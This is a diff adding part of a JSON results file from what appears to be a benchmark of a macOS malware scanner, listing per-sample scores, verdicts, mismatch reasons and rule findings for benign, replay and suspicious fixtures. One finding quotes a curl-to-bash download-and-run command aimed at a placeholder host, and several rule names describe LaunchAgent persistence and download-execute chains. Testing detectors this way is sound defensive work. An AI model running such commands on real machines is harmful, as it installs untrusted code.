+        "No dedicated analyzer for unknown. Fallback to generic analyzer.",
+        "generic_partial: No dedicated analyzer for unknown. Fallback to generic analyzer."
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/app\/noisy_app_updater_manifest_01.json",
+      "sampleID" : "noisy_app_updater_manifest_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:29Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 40,
+        "min" : 18
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/applescript\/noisy_applescript_admin_prompt_sim_01.applescript",
+      "sampleID" : "noisy_applescript_admin_prompt_sim_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:29Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 177,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 28,
+        "min" : 10
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "检测到脚本高风险行为特征",
+        "[applescript.finder_control] 控制 Finder 行为 [low] L3-3 Δ8: tell application \"Finder\""
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/applescript\/noisy_applescript_finder_batch_rename_01.applescript",
+      "sampleID" : "noisy_applescript_finder_batch_rename_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:29Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 30,
+        "min" : 12
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "检测到脚本高风险行为特征",
+        "[applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application \"Terminal\""
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/applescript\/noisy_applescript_terminal_echo_pwd_01.applescript",
+      "sampleID" : "noisy_applescript_terminal_echo_pwd_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:29Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 190,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 30,
+        "min" : 12
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "检测到脚本高风险行为特征",
+        "[javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process');",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/js\/noisy_js_child_process_ls_01.js",
+      "sampleID" : "noisy_js_child_process_ls_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:29Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 179,
+      "analysisSummary" : "该样本检测到编码\/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 25\/100，判定 Clean（低风险）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 35,
+        "min" : 15
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "检测到混淆或编码逃逸",
+        "[javascript.eval] JavaScript 动态执行(eval) [high] L3-3 Δ22: const result = eval(expression);",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "noisy_benign\/js\/noisy_js_eval_math_only_01.js",
+      "sampleID" : "noisy_js_eval_math_only_01",
+      "score" : 25,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:30Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 182,
+      "analysisSummary" : "该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；未获取到可执行样本签名信息。。综合评分 45\/100，判定 Suspicious（可疑）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 32,
+        "min" : 14
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "检测到远程下载执行链",
+        "检测到混淆或编码逃逸",
+        "[javascript.network_download_exec] 网络下载并执行链 [critical] L10-10 Δ34: https.get('https:\/\/example.com\/', (res) => {",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_high",
+      "path" : "noisy_benign\/js\/noisy_js_network_cache_text_01.js",
+      "sampleID" : "noisy_js_network_cache_text_01",
+      "score" : 45,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:30Z",
+      "verdict" : "suspicious"
+    },
+    {
+      "analysisDurationMs" : 177,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 42,
+        "min" : 20
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/js\/noisy_js_postinstall_sim_01.js",
+      "sampleID" : "noisy_js_postinstall_sim_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:30Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 771,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "machO",
+      "expectedScoreRange" : {
+        "max" : 35,
+        "min" : 15
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "Executable file",
+        "No dedicated analyzer for machO. Fallback to generic analyzer.",
+        "generic_partial: No dedicated analyzer for machO. Fallback to generic analyzer."
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/pkg\/noisy_pkg_fixture_02",
+      "sampleID" : "noisy_pkg_fixture_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:31Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 180,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 48,
+        "min" : 22
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/pkg\/noisy_pkg_preinstall_sim_01.sh",
+      "sampleID" : "noisy_pkg_preinstall_sim_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:31Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 178,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 28,
+        "min" : 12
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "检测到混淆或编码逃逸",
+        "[python.subprocess_exec] subprocess 外部进程执行 [high] L11-11 Δ20: result = subprocess.run(step, check=True, capture_output=True, text=True)",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/python\/noisy_python_build_subprocess_01.py",
+      "sampleID" : "noisy_python_build_subprocess_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:31Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 182,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 35,
+        "min" : 16
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/python\/noisy_python_dynamic_loader_sim_01.py",
+      "sampleID" : "noisy_python_dynamic_loader_sim_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:31Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 177,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 32,
+        "min" : 14
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/python\/noisy_python_remote_text_api_01.py",
+      "sampleID" : "noisy_python_remote_text_api_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:31Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 179,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 24,
+        "min" : 10
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "noisy_benign\/python\/noisy_python_tempfile_cleanup_01.py",
+      "sampleID" : "noisy_python_tempfile_cleanup_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:32Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 177,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 45,
+        "min" : 20
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/python\/noisy_python_updater_01.py",
+      "sampleID" : "noisy_python_updater_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:32Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 180,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 24,
+        "min" : 10
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "noisy_benign\/shell\/noisy_shell_appsupport_style_write_01.sh",
+      "sampleID" : "noisy_shell_appsupport_style_write_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:32Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 182,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 30,
+        "min" : 12
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/shell\/noisy_shell_base64_config_01.sh",
+      "sampleID" : "noisy_shell_base64_config_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:32Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 183,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 26,
+        "min" : 10
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "noisy_benign\/shell\/noisy_shell_chmod_tool_01.sh",
+      "sampleID" : "noisy_shell_chmod_tool_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:32Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 179,
+      "analysisSummary" : "该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；未获取到可执行样本签名信息。。综合评分 45\/100，判定 Suspicious（可疑）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 45,
+        "min" : 20
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "检测到远程下载执行链",
+        "[shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L8-8 Δ35: DANGEROUS_LOOKING_CMD='curl -fsSL https:\/\/example.invalid\/installer.sh | bash'",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_high",
+      "path" : "noisy_benign\/shell\/noisy_shell_installer_like_01.sh",
+      "sampleID" : "noisy_shell_installer_like_01",
+      "score" : 45,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "suspicious"
+    },
+    {
+      "analysisDurationMs" : 183,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 30,
+        "min" : 12
+      },
+      "expectedVerdict" : "benign_noisy",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "noisy_benign",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "noisy_benign\/shell\/noisy_shell_update_checker_02.sh",
+      "sampleID" : "noisy_shell_update_checker_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 1,
+      "detectedType" : "jsonReplay",
+      "errorMessage" : "The data couldn’t be read because it is missing.",
+      "findings" : [
+
+      ],
+      "group" : "replay_clean",
+      "mismatchReason" : "analysis_failed",
+      "path" : "replay\/clean\/replay_clean_app_lifecycle_02.json",
+      "sampleID" : "replay_clean_app_lifecycle_02",
+      "score" : 0,
+      "status" : "failed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "analysisSummary" : "Replay evaluation: unknown (score 0)",
+      "detectedType" : "jsonReplay",
+      "expectedScoreRange" : {
+        "max" : 15,
+        "min" : 0
+      },
+      "expectedVerdict" : "clean",
+      "findings" : [
+
+      ],
+      "group" : "replay_clean",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "replay\/clean\/replay_clean_backup_flow_01.json",
+      "sampleID" : "replay_clean_backup_flow_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "detectedType" : "jsonReplay",
+      "errorMessage" : "The data couldn’t be read because it is missing.",
+      "findings" : [
+
+      ],
+      "group" : "replay_clean",
+      "mismatchReason" : "analysis_failed",
+      "path" : "replay\/clean\/replay_clean_js_fetch_cache_02.json",
+      "sampleID" : "replay_clean_js_fetch_cache_02",
+      "score" : 0,
+      "status" : "failed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "detectedType" : "jsonReplay",
+      "errorMessage" : "The data couldn’t be read because it is missing.",
+      "findings" : [
+
+      ],
+      "group" : "replay_clean",
+      "mismatchReason" : "analysis_failed",
+      "path" : "replay\/clean\/replay_clean_pkg_appsupport_install_02.json",
+      "sampleID" : "replay_clean_pkg_appsupport_install_02",
+      "score" : 0,
+      "status" : "failed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "detectedType" : "jsonReplay",
+      "errorMessage" : "The data couldn’t be read because it is missing.",
+      "findings" : [
+
+      ],
+      "group" : "replay_clean",
+      "mismatchReason" : "analysis_failed",
+      "path" : "replay\/clean\/replay_clean_python_scan_report_02.json",
+      "sampleID" : "replay_clean_python_scan_report_02",
+      "score" : 0,
+      "status" : "failed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "detectedType" : "jsonReplay",
+      "errorMessage" : "The data couldn’t be read because it is missing.",
+      "findings" : [
+
+      ],
+      "group" : "replay_malicious",
+      "mismatchReason" : "analysis_failed",
+      "path" : "replay\/malicious\/replay_malicious_app_bash_curl_persist_02.json",
+      "sampleID" : "replay_malicious_app_bash_curl_persist_02",
+      "score" : 0,
+      "status" : "failed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "detectedType" : "jsonReplay",
+      "errorMessage" : "The data couldn’t be read because it is missing.",
+      "findings" : [
+
+      ],
+      "group" : "replay_malicious",
+      "mismatchReason" : "analysis_failed",
+      "path" : "replay\/malicious\/replay_malicious_app_osascript_chain_02.json",
+      "sampleID" : "replay_malicious_app_osascript_chain_02",
+      "score" : 0,
+      "status" : "failed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "analysisSummary" : "Replay evaluation: malicious (score 100)",
+      "detectedType" : "jsonReplay",
+      "expectedScoreRange" : {
+        "max" : 100,
+        "min" : 85
+      },
+      "expectedVerdict" : "malicious",
+      "findings" : [
+        "[script.download_execute_chain] 可疑脚本下载执行链 (+35)",
+        "[persistence.launch_agent_write] 写入 LaunchAgent \/ LaunchDaemon (+30)",
+        "[process.spawn_shell] 样本拉起 Shell 子进程 (+15)",
+        "[network.remote_connect] 运行期远程网络连接 (+10)",
+        "[filesystem.sensitive_path_change] 修改敏感路径 (+20)"
+      ],
+      "group" : "replay_malicious",
+      "matchedScoreRange" : true,
+      "matchedVerdict" : true,
+      "path" : "replay\/malicious\/replay_malicious_chain_01.json",
+      "sampleID" : "replay_malicious_chain_01",
+      "score" : 100,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "malicious"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "detectedType" : "jsonReplay",
+      "errorMessage" : "The data couldn’t be read because it is missing.",
+      "findings" : [
+
+      ],
+      "group" : "replay_malicious",
+      "mismatchReason" : "analysis_failed",
+      "path" : "replay\/malicious\/replay_malicious_pkg_postinstall_multiegres_02.json",
+      "sampleID" : "replay_malicious_pkg_postinstall_multiegres_02",
+      "score" : 0,
+      "status" : "failed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "detectedType" : "jsonReplay",
+      "errorMessage" : "The data couldn’t be read because it is missing.",
+      "findings" : [
+
+      ],
+      "group" : "replay_malicious",
+      "mismatchReason" : "analysis_failed",
+      "path" : "replay\/malicious\/replay_malicious_python_subprocess_priv_02.json",
+      "sampleID" : "replay_malicious_python_subprocess_priv_02",
+      "score" : 0,
+      "status" : "failed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "detectedType" : "jsonReplay",
+      "errorMessage" : "The data couldn’t be read because it is missing.",
+      "findings" : [
+
+      ],
+      "group" : "replay_suspicious",
+      "mismatchReason" : "analysis_failed",
+      "path" : "replay\/suspicious\/replay_suspicious_app_shell_egress_02.json",
+      "sampleID" : "replay_suspicious_app_shell_egress_02",
+      "score" : 0,
+      "status" : "failed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "analysisSummary" : "Replay evaluation: suspicious (score 50)",
+      "detectedType" : "jsonReplay",
+      "expectedScoreRange" : {
+        "max" : 80,
+        "min" : 60
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "[persistence.launch_agent_write] 写入 LaunchAgent \/ LaunchDaemon (+30)",
+        "[filesystem.sensitive_path_change] 修改敏感路径 (+20)"
+      ],
+      "group" : "replay_suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "replay\/suspicious\/replay_suspicious_persistence_attempt_01.json",
+      "sampleID" : "replay_suspicious_persistence_attempt_01",
+      "score" : 50,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "suspicious"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "detectedType" : "jsonReplay",
+      "errorMessage" : "The data couldn’t be read because it is missing.",
+      "findings" : [
+
+      ],
+      "group" : "replay_suspicious",
+      "mismatchReason" : "analysis_failed",
+      "path" : "replay\/suspicious\/replay_suspicious_pkg_persistence_mirror_02.json",
+      "sampleID" : "replay_suspicious_pkg_persistence_mirror_02",
+      "score" : 0,
+      "status" : "failed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "detectedType" : "jsonReplay",
+      "errorMessage" : "The data couldn’t be read because it is missing.",
+      "findings" : [
+
+      ],
+      "group" : "replay_suspicious",
+      "mismatchReason" : "analysis_failed",
+      "path" : "replay\/suspicious\/replay_suspicious_python_decode_plist_mirror_02.json",
+      "sampleID" : "replay_suspicious_python_decode_plist_mirror_02",
+      "score" : 0,
+      "status" : "failed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 0,
+      "detectedType" : "jsonReplay",
+      "errorMessage" : "The data couldn’t be read because it is missing.",
+      "findings" : [
+
+      ],
+      "group" : "replay_suspicious",
+      "mismatchReason" : "analysis_failed",
+      "path" : "replay\/suspicious\/replay_suspicious_shell_fanout_tmp_egress_02.json",
+      "sampleID" : "replay_suspicious_shell_fanout_tmp_egress_02",
+      "score" : 0,
+      "status" : "failed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "unknown"
+    },
+    {
+      "analysisDurationMs" : 182,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 52,
+        "min" : 35
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/applescript\/suspicious_applescript_auth_lure_prompt_02.applescript",
+      "sampleID" : "suspicious_applescript_auth_lure_prompt_02",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 72,
+        "min" : 55
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到脚本高风险行为特征",
+        "[applescript.do_shell_script] AppleScript 调用 shell [high] L2-2 Δ20: do shell script \"echo '[dry-run] would run: \" & suspiciousCmd & \"'\"",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/applescript\/suspicious_applescript_doshell_echo_02.applescript",
+      "sampleID" : "suspicious_applescript_doshell_echo_02",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 78,
+        "min" : 58
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/applescript\/suspicious_applescript_keystroke_sim_01.applescript",
+      "sampleID" : "suspicious_applescript_keystroke_sim_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 50,
+        "min" : 35
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/applescript\/suspicious_applescript_system_settings_text_02.applescript",
+      "sampleID" : "suspicious_applescript_system_settings_text_02",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:33Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 178,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 70,
+        "min" : 52
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到脚本高风险行为特征",
+        "[applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application \"Terminal\""
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/applescript\/suspicious_applescript_terminal_download_print_02.applescript",
+      "sampleID" : "suspicious_applescript_terminal_download_print_02",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:34Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 2236,
+      "analysisSummary" : "该样本样本可执行但未签名，来源可信度不足。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "appBundle",
+      "expectedScoreRange" : {
+        "max" : 78,
+        "min" : 60
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "未获取到 Entitlements，权限边界不可完全判断",
+        "无法完整读取签名信息：\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/SyntheticSuspiciousFixture_02.app: code object is not signed at all",
+        "未提取到 Entitlements（可能该应用未声明或无法读取）",
